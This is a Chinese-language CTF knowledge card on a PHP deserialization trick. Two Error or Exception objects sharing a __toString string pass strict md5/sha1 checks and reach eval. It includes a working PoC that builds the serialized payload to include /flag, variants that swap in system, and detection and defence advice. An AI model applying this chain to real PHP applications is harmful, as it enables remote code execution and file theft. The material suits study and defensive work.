---
id: web-php-deserialization-error-exception-tostring-hash-bypass
title: PHP Error/Exception 内置类绕过 md5/sha1 强比较：__toString 同串不同对象 + eval 执行 payload
type: scenario
domain: web
path: web/php/deserialization
technique: php-error-exception-tostring-hash-bypass
aliases:
- Error 类绕过 md5
- Exception 绕过 sha1
- __toString 哈希绕过
- 内置类绕过强比较
- Greatphp
- eval Error 对象
- 同串不同对象
tags:
- php
- deserialization
- magic-method
- tostring
- error
- exception
- hash-bypass
- eval
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V176
  verified_at: '2026-11-06T17:11:13+08:00'
  notes: 已对照原文核对：SYCLOVER __wakeup 强比较、同行构造 message 相同的 Error 对象、__toString 返回同串、?><?=include~取反 绕过过滤、URL 编码 payload 与 flag 回显截图均一致；PoC 未复跑
---

## 一句话结论

当 `__wakeup` 要求 `$a != $b`、`md5($a) === md5($b)`、`sha1($a) === sha1($b)` 后才 `eval($a)` 时，可传入两个在同一行构造、message 相同的 `Error`（或 `Exception`）对象：对象本身不相等，但 `__toString` 返回相同的“Error: <message> in <file>:<line> + Stack trace”字符串，因此两个哈希完全一致；`eval` 把对象当字符串又触发 `__toString`，攻击者把 `?><?=...?>` 放在 message 开头即可闭合报错前缀并执行代码。

## 原理

- **对象转字符串**：`md5()`/`sha1()` 的参数若是对象，PHP 会调用其 `__toString()` 再计算哈希。`Error`/`Exception` 都实现了 `__toString()`，返回 `类名: message in file:line` 加堆栈信息。
- **同串不同对象**：`__toString` 不包含 `code` 属性。两个对象只要 message 相同、在同一个文件同一行构造，返回的字符串就完全相同（行号相同），`md5`/`sha1` 自然相等；而对象本身因 `code` 不同/对象身份不同，`$a != $b` 为真，正好通过 `($a != $b) && md5($a)===md5($b) && sha1($a)===sha1($b)`。
- **eval 对象**：`eval($a)` 期望字符串，传入对象会触发 `__toString()`；返回内容形如：
  `Error: <message> in /path/file.php:19` + 换行 + `Stack trace: #0 {main}`。
- **闭合报错前缀**：由于返回串前面固定有 `Error: `，攻击者把 message 设为 `?><?=include~...?>`，eval 实际看到的是 `Error: ?><?=include...?>`：`?>` 结束 PHP 代码段，`<?=` 重新进入 PHP 并执行 include，后面的报错信息被当作 HTML 输出。这样即使代码过滤了 `<?php`、括号和引号，也能执行。
- **无引号构造路径**：`include /flag` 中的 `/flag` 可用按位取反 `~` 加 URL 编码字节构造（如 `~%D0%99%93%9E%98` 得到 `/flag`），避开引号/关键字过滤。
- **PHP 版本**：`Error` 从 PHP 7.0 起可用；`Exception` 在 PHP 5/7 均可用，行为相同。

## 触发条件

- 存在用户可控的 `unserialize()`，且入口类的 `__wakeup`/`__destruct` 使用 `md5`/`sha1` 做比较后进入 `eval`/`include`/`system` 等 sink。
- 比较形式为“对象不等 + 哈希强相等”，且代码没有对传入值做 `is_string`/类型白名单。
- 目标 PHP 启用 `Error`（PHP 7+）或 `Exception`；`eval` 未被禁用；`preg_match` 只过滤了部分关键字（如 `<?php`、括号、引号）。
- 攻击者能控制 message 内容，并确保两个对象在同一行构造（或行号相同）。

## 利用步骤

1. 阅读入口类，确认 `__wakeup` 的比较顺序与后续 sink（eval/include/system）。
2. 构造 message：以 `?>` 开头闭合 eval 中的报错前缀，再写 `<?=include~...?>` 或 `<?=system(...)?>`；用 `~` 取反或十六进制/URL 编码绕过关键字过滤。
3. 在同一行创建两个 `Error`（或 `Exception`）对象，message 相同、code 不同，使 `__toString` 返回完全相同的字符串。
4. 把两个对象分别赋给入口类的两个属性（如 `syc`、`lover`），`serialize()` 后 URL 编码传给 `unserialize`。
5. `__wakeup` 的 `!=` 与 `md5`/`sha1` 强比较通过，`eval($obj)` 触发 `__toString`，闭合前缀后执行 payload，读取 flag。

## PoC

```php
<?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;
    public function __wakeup(){
        if (($this->syc != $this->lover)
            && (md5($this->syc) === md5($this->lover))
            && (sha1($this->syc) === sha1($this->lover))) {
            if (!preg_match("/<\?php|\(|\)|\"|'/", $this->syc, $match)) {
                eval($this->syc);
            } else {
                die("Try Hard !!");
            }
        }
    }
}

$str = "?><?=include~" . urldecode('%D0%99%93%9E%98') . "?>";
# 等价于：?><?=include /flag?>
$a = new Error($str, 1);
$b = new Error($str, 2);          // 与 $a 在同一行构造，__toString 返回同一字符串
$c = new SYCLOVER();
$c->syc = $a;
$c->lover = $b;
echo urlencode(serialize($c));
?>
```

说明：原文在 [2020 极客大挑战] Greatphp 中实测该 payload 带出 flag；本库未复跑。

## 变体与关联

- 变体：PHP 5 用 `Exception` 替代 `Error`；两者 `__toString` 行为一致。
- 变体：把 `include` 换成 `readfile`/`highlight_file`/`system`，或利用 `?>` 后直接输出 HTML 外带数据。
- 变体：过滤更严时可用反引号、`~` 取反、十六进制、`${}` 变量拼接等方式构造敏感路径/函数名。
- 关联：[[web-php-deserialization-double-md5-weak-compare-pop-chain]]（弱比较 `==` 的 0e 绕过，本卡是对象 `===` 强比较绕过）、[[web-php-deserialization-magic-chain-eval-wakeup-bypass]]（`__wakeup` 到 eval 的 POP 链）、[[web-php-deserialization-wakeup-pregmatch-tostring-get-invoke-read]]（`__toString` 触发点）。

## 检测与防御

- 不要对不可信输入 `unserialize()`；必须使用时用 `allowed_classes` 白名单，禁止 `Error`/`Exception` 等内置类进入。
- 哈希比较前强制 `is_string()`/类型校验；不要对对象调用 `md5`/`sha1`；使用 `hash_equals`。
- 禁止 `eval`；用白名单映射代替动态执行；对 `include` 路径做固定白名单。
- 检测：请求中出现 `O:7:"Error"`/`O:9:"Exception"` 序列化结构、`__wakeup` 附近出现 `md5`/`sha1` 与 `eval`、message 含 `?>`/`<?=`/`~` 取反字节；监控 `eval` 与文件包含行为。
